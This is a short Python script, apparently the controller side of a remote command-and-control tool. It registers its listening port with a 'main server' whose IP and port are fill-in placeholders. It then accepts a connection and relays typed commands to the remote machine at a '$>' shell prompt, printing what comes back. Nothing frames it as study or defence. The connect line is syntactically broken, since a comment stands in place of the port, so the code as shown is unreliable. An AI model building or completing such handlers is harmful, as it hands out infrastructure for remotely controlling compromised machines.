import socket
import sys

m_ip = "ENTER YOUR MAIN SERVER IP HERE!"
m_port = int(sys.argv[1])
if len(sys.argv) > 2:
    m_ip = str(sys.argv[2])    

r_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r_client.connect((m_ip, #ENTER YOUR MAIN SERVER PORT HERE!))
data = bytes(list(bytes("server", "ascii")) + list(int.to_bytes(m_port, 4, 'little')) + list(bytes(6)))
r_client.send(data);

r_client.close();

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", m_port));
server.listen(5)

print(f"[{m_port}] Waiting for connection...")
conn, addr = server.accept()
print(f"[{m_port}] Connected: {addr}")

while True:
    cmd = input(f"{addr} $>")
    if cmd == "quit" or cmd == "disconnect":
        break;
    
    conn.send(cmd.encode())
    response = conn.recv(256).decode()
    print(response)
